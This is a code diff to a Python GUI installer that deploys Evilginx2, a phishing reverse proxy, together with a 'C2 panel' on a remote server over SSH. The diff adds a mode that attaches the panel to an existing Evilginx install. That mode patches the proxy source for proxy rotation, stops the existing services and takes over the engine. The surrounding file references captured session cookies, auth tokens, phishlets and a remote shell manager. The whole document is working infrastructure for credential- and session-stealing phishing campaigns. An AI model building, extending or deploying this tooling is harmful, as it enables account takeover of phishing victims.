@@ -3,7 +3,8 @@
 Evilginx + C2 Panel installer (tkinter GUI).
 
 Connects over SSH and installs:
-  Go 1.20, DNS/port 53, clean evilginx2 clone, web panel, systemd.
+  Full INSTALL: Go 1.20, DNS/port 53, clean evilginx2 clone, web panel, systemd.
+  INSTALL ONLY CP: web panel only, attached to an Evilginx already on the server.
 
 Usage:  python evilginx_setup.py
 """
@@ -12,6 +13,7 @@ from __future__ import annotations
 
 import os
 import sys
+import json
 import time
 import shlex
 import threading
@@ -41,7 +43,7 @@ if getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
     HERE = sys._MEIPASS
 PAYLOAD = os.path.join(HERE, "payload")
 PANEL_PORT = 8443
-PANEL_BUILD = "3.5.8"  # keep in sync with payload/app.py PANEL_VERSION
+PANEL_BUILD = "3.5.9"  # keep in sync with payload/app.py PANEL_VERSION
 GO_VER = "1.20"
 REMOTE_HOME_DEFAULT = "/root"
 REMOTE_EGX = "/root/evilginx2"
@@ -173,6 +175,12 @@ class Installer:
         self.python = "python3"
         self.venv = f"{REMOTE_PANEL}/venv"
         self.home = REMOTE_HOME_DEFAULT
+        self.egx_dir = REMOTE_EGX
+        self.egx_bin = f"{REMOTE_EGX}/build/evilginx"
+        self.egx_phishlets = f"{REMOTE_EGX}/phishlets"
+        self.egx_config = "/root/.evilginx/config.json"
+        self.egx_data = "/root/.evilginx/data.db"
+        self.egx_args = []
 
     def set_pct(self, n):
         self.progress(n)
@@ -557,7 +565,7 @@ class Installer:
         hook_py = os.path.join(PAYLOAD, "patches", "apply_egx_429_hook.py")
         required_marks = {
             hook_py: ["egx-429", "StatusCode == 429", "auth_tokens = pl.cookieAuthTokens"],
-            os.path.join(PAYLOAD, "app.py"): ["def api_sessions_clear", "def api_fs_list", "def api_service_create", "def favicon", "def _cookie_looks_like_jwt", "class ShellManager", "class JournalFollower", "def api_health", "def api_proxy_key", "import proxy_engine", "def api_proxy_carousel", "def _proxy_live_loop", "def _parse_exec_start", "PYTHONUNBUFFERED", "def api_dashboard_map", "_geo_lookup", "def api_proxy_custom_add", "import ai_assistant"],
+            os.path.join(PAYLOAD, "app.py"): ["def api_sessions_clear", "def api_fs_list", "def api_service_create", "def favicon", "def _cookie_looks_like_jwt", "class ShellManager", "class JournalFollower", "def api_health", "def api_proxy_key", "import proxy_engine", "def api_proxy_carousel", "def _proxy_live_loop", "def _parse_exec_start", "PYTHONUNBUFFERED", "def api_dashboard_map", "_geo_lookup", "def api_proxy_custom_add", "import ai_assistant", "EVILGINX_BIN", "EVILGINX_ARGS"],
             os.path.join(PAYLOAD, "ai_assistant.py"): ["/api/ai/chat", "/api/ai/autofix", "OpenRouter", "ai_openrouter.json"],
             os.path.join(PAYLOAD, "proxy_engine.py"): [
                 "def deploy_async", "class _Sidecar", "def record_auth_429", "def repair_instance",
@@ -607,12 +615,19 @@ class Installer:
 
         # panel env (login = SSH login/password)
         pass_esc = self.password.replace("\\", "\\\\").replace('"', '\\"')
+        args_raw = " ".join(shlex.quote(a) for a in (self.egx_args or []))
+        args_esc = args_raw.replace("\\", "\\\\").replace('"', '\\"')
         env = (
             f"PANEL_HOST=0.0.0.0\n"
             f"PANEL_PORT={PANEL_PORT}\n"
             f"PANEL_USER={self.user}\n"
             f'PANEL_PASS="{pass_esc}"\n'
-            f"EVILGINX_DIR={REMOTE_EGX}\n"
+            f"EVILGINX_DIR={self.egx_dir}\n"
+            f"EVILGINX_BIN={self.egx_bin}\n"
+            f"PHISHLETS_DIR={self.egx_phishlets}\n"
+            f"EVILGINX_CONFIG={self.egx_config}\n"
+            f"EVILGINX_DATA={self.egx_data}\n"
+            f'EVILGINX_ARGS="{args_esc}"\n'
             f"PYTHONUNBUFFERED=1\n"
         )
         # write via sftp to avoid shell quoting issues
@@ -677,11 +692,143 @@ WantedBy=multi-user.target
         self.log("[+] evilginx-panel is active")
         # panel starts evilginx itself; wait and check process
         time.sleep(3)
-        _, ps = self.ssh.run(f"pgrep -af {REMOTE_EGX}/build/evilginx || true")
+        _, ps = self.ssh.run(f"pgrep -af {shlex.quote(self.egx_bin)} || true")
         if "evilginx" in ps:
             self.log("[+] evilginx process is running")
         else:
             self.log("[!] evilginx process not seen yet — panel will retry on start")
+
+    def detect_existing_evilginx(self) -> dict:
+        """Locate any already-installed Evilginx (stock, Pro, custom fork)."""
+        self.set_pct(45)
+        self.log("[*] Looking for an existing Evilginx install")
+        local = os.path.join(PAYLOAD, "patches", "detect_existing_evilginx.py")
+        if not os.path.isfile(local):
+            raise RuntimeError("missing payload/patches/detect_existing_evilginx.py")
+        remote_py = "/tmp/detect_existing_evilginx.py"
+        self.ssh.put_file(local, remote_py)
+        code, out = self.ssh.run(f"python3 {remote_py}", timeout=90)
+        payload = ""
+        for line in reversed((out or "").splitlines()):
+            line = line.strip()
+            if line.startswith("{") and line.endswith("}"):
+                payload = line
+                break
+        if not payload:
+            raise RuntimeError(
+                "Could not detect Evilginx on this server.\n"
+                "Install Only CP needs an already-installed evilginx binary.\n"
+                + (out or "")[-1500:]
+            )
+        try:
+            info = json.loads(payload)
+        except Exception as e:
+            raise RuntimeError(f"Evilginx detect JSON parse failed: {e}\n{payload[:800]}")
+        if not info.get("ok") or not info.get("bin"):
+            raise RuntimeError(
+                info.get("error")
+                or "Evilginx binary not found. Full INSTALL clones kgretzky/evilginx2; "
+                "Install Only CP attaches the panel to an engine that is already on the box."
+            )
+        self.egx_bin = info["bin"]
+        self.egx_dir = info.get("dir") or os.path.dirname(info["bin"])
+        self.egx_phishlets = info.get("phishlets") or f"{self.egx_dir}/phishlets"
+        self.egx_config = info.get("config") or "/root/.evilginx/config.json"
+        self.egx_data = info.get("data") or "/root/.evilginx/data.db"
+        self.egx_args = list(info.get("args") or [])
+        self.log(f"[+] binary:    {self.egx_bin}")
+        if info.get("version"):
+            self.log(f"    version:   {info['version']}")
+        self.log(f"    dir:       {self.egx_dir}")
+        self.log(f"    phishlets: {self.egx_phishlets}")
+        self.log(f"    config:    {self.egx_config}")
+        if self.egx_args:
+            self.log(f"    extra argv:{' '.join(self.egx_args)}")
+        if not self.ssh.ok(f"test -x {shlex.quote(self.egx_bin)}"):
+            raise RuntimeError(f"detected binary is not executable: {self.egx_bin}")
+        if not self.ssh.ok(f"test -d {shlex.quote(self.egx_phishlets)}"):
+            self.log("[!] phishlets dir missing — panel phishlet pages will be empty until YAML exists")
+        return info
+
+    def maybe_patch_existing_429(self, info: dict):
+        """Best-effort 429 hook. Never fail Install Only CP if the fork does not match."""
+        self.set_pct(62)
+        src = info.get("src_go") or f"{self.egx_dir}/core/http_proxy.go"
+        if not info.get("has_source") or not self.ssh.ok(f"test -f {shlex.quote(src)}"):
+            self.log("[!] no http_proxy.go next to this binary — skip 429 hook (proxy rotate needs that patch)")
+            return
+        local = os.path.join(PAYLOAD, "patches", "apply_egx_429_hook.py")
+        if not os.path.isfile(local):
+            self.log("[!] 429 hook script missing locally — skip")
+            return
+        remote_py = "/tmp/apply_egx_429_hook.py"
+        self.ssh.put_file(local, remote_py)
+        code, out = self.ssh.run(f"python3 {remote_py} {shlex.quote(src)}", timeout=30)
+        text = (out or "").lower()
+        if code == 0 and ("patched" in text or "already patched" in text):
+            self.log("[+] 429 hook present in http_proxy.go")
+        else:
+            self.log("[!] 429 hook not applied (this fork's http_proxy.go differs) — panel still works")
+            self.log("    Proxy Manager auto-rotate on origin 429 needs that hook; other panel features are unchanged")
+            return
+        stock_bin = f"{self.egx_dir}/build/evilginx"
+        bin_is_stock = self.egx_bin.replace("\\", "/").endswith("/build/evilginx")
+        if not bin_is_stock:
+            self.log("[!] will not rebuild a custom/Pro binary — restart uses the existing engine")
+            return
+        if not self.ssh.ok("export PATH=/usr/local/go/bin:$PATH && command -v go"):
+            self.log("[!] Go not installed — 429 hook is in source but binary was not rebuilt")
+            return
+        self.log("[*] Rebuilding stock evilginx so the 429 hook is in the binary")
+        go_path = "export PATH=/usr/local/go/bin:$PATH"
+        code, out = self.ssh.run(f"{go_path} && cd {shlex.quote(self.egx_dir)} && make", timeout=600)
+        if code == 0 and self.ssh.ok(f"test -x {shlex.quote(stock_bin)}"):
+            self.log("[+] rebuilt build/evilginx")
+        else:
+            self.log("[!] rebuild skipped/failed — existing binary kept")
+
+    def adopt_existing_engine(self, info: dict):
+        """Stop systemd evilginx units so the panel owns the process. Keep extra argv."""
+        self.set_pct(70)
+        extra = list(self.egx_args)
+        has_dash = any(a == "-dashboard" or str(a).startswith("-dashboard=") for a in extra)
+        if info.get("has_dashboard_flag") and not has_dash:
+            extra.extend(["-dashboard", ""])
+            self.log("[*] this binary has -dashboard; binding it empty so :5000 is not opened")
+        self.egx_args = extra
+        for unit in info.get("units") or []:
+            unit = (unit or "").strip()
+            if not unit or "panel" in unit.lower() or "feed" in unit.lower():
+                continue
+            self.log(f"[*] stopping systemd {unit} (panel will start the binary)")
+            self.ssh.run(f"systemctl stop {shlex.quote(unit)} 2>/dev/null || true")
+            self.ssh.run(f"systemctl disable {shlex.quote(unit)} 2>/dev/null || true")
+        self.ssh.run(f"pkill -9 -f {shlex.quote(self.egx_bin)} 2>/dev/null || true")
+
+    def run_panel_only(self):
+        """Install the C2 panel onto an existing Evilginx. Does not clone or replace the engine."""
+        self.detect()
+        self.apt_update()
+        self.install_base_packages()
+        self.install_python_deps()
+        self.install_mysql_connector_system()
+        info = self.detect_existing_evilginx()
+        self.maybe_patch_existing_429(info)
+        self.adopt_existing_engine(info)
+        self.deploy_panel()
+        self.firewall()
+        self.start_all()
+        self.set_pct(100)
+        url = f"http://{self.ssh.host}:{PANEL_PORT}"
+        self.log("")
+        self.log("=" * 54)
+        self.log("  INSTALL ONLY CP COMPLETE")
+        self.log(f"  Panel:    {url}")
+        self.log(f"  Engine:   {self.egx_bin}")
+        self.log(f"  Login:    {self.user}")
+        self.log("  Password: (the SSH password you entered)")
+        self.log("  Evilginx binary was kept as-is (not reinstalled).")
+        self.log("=" * 54)
 
     def run(self):
         self.detect()
@@ -805,12 +952,21 @@ class App(tk.Tk):
         row(2, "LOGIN", self.var_user)
         row(3, "PASSWORD", self.var_pass, show="•")
 
+        self.btn_row = tk.Frame(self, bg=BG)
+        self.btn_row.pack(fill="x", padx=18, pady=(10, 8))
         self.btn = tk.Button(
-            self, text="INSTALL", command=self.start, font=("Segoe UI", 12, "bold"),
+            self.btn_row, text="INSTALL", command=self.start, font=("Segoe UI", 12, "bold"),
             bg=ACCENT, fg=BG, activebackground="#4ade80", activeforeground=BG,
             relief="flat", cursor="hand2", pady=10,
         )
-        self.btn.pack(fill="x", padx=18, pady=(10, 8))
+        self.btn.pack(side="left", fill="x", expand=True, padx=(0, 6))
+        self.btn_cp = tk.Button(
+            self.btn_row, text="INSTALL ONLY CP", command=self.start_panel_only,
+            font=("Segoe UI", 12, "bold"),
+            bg=CYAN, fg=BG, activebackground="#67e8f9", activeforeground=BG,
+            relief="flat", cursor="hand2", pady=10,
+        )
+        self.btn_cp.pack(side="left", fill="x", expand=True, padx=(6, 0))
 
         style = ttk.Style()
         try:
@@ -829,7 +985,9 @@ class App(tk.Tk):
         self.logbox.tag_configure("okmark", foreground=ACCENT, font=("Segoe UI", 18, "bold"))
         self.logbox.configure(state="disabled")
         self._log(f"[*] Installer v{PANEL_BUILD} — current panel build packed in payload/")
-        self._log("[*] Fill IP / port / login / password and press INSTALL")
+        self._log("[*] Fill IP / port / login / password")
+        self._log("[*] INSTALL = full stack (clone + build kgretzky/evilginx2 + panel)")
+        self._log("[*] INSTALL ONLY CP = panel only, attach to Evilginx already on the server")
         self._log("[*] Panel will listen on port 8443. Login = same SSH credentials.")
 
     def _log(self, msg):
@@ -859,6 +1017,22 @@ class App(tk.Tk):
             self._log(f"[!] Could not open browser: {e}")
 
     def start(self):
+        self._begin("full")
+
+    def start_panel_only(self):
+        self._begin("panel")
+
+    def _set_busy(self, busy: bool, mode: str = "full"):
+        if busy:
+            self.btn.configure(state="disabled", text="INSTALLING...")
+            self.btn_cp.configure(state="disabled", text="WAIT...")
+            if mode == "panel":
+                self.btn_cp.configure(text="INSTALLING CP...")
+        else:
+            self.btn.configure(state="normal", text="INSTALL")
+            self.btn_cp.configure(state="normal", text="INSTALL ONLY CP")
+
+    def _begin(self, mode: str):
         if self.installing:
             return
         ip = self.var_ip.get().strip()
@@ -872,18 +1046,21 @@ class App(tk.Tk):
             messagebox.showerror("Payload missing", f"Folder not found:\n{PAYLOAD}")
             return
         self.installing = True
-        self.btn.configure(state="disabled", text="INSTALLING...")
+        self._set_busy(True, mode)
         self.pb.configure(value=1)
-        t = threading.Thread(target=self._worker, args=(ip, port, user, pw), daemon=True)
+        t = threading.Thread(target=self._worker, args=(ip, port, user, pw, mode), daemon=True)
         t.start()
 
-    def _worker(self, ip, port, user, pw):
+    def _worker(self, ip, port, user, pw, mode="full"):
         ssh = None
         try:
             ssh = SSH(ip, port, user, pw, self._log)
             ssh.connect()
             inst = Installer(ssh, user, pw, self._progress)
-            inst.run()
+            if mode == "panel":
+                inst.run_panel_only()
+            else:
+                inst.run()
             url = f"http://{ip}:{PANEL_PORT}"
             self._log(f"[*] Opening browser: {url}")
             self._log_done()
@@ -897,7 +1074,7 @@ class App(tk.Tk):
             if ssh:
                 ssh.close()
             self.installing = False
-            self.after(0, lambda: self.btn.configure(state="normal", text="INSTALL"))
+            self.after(0, lambda: self._set_busy(False))
 
 
 def main():
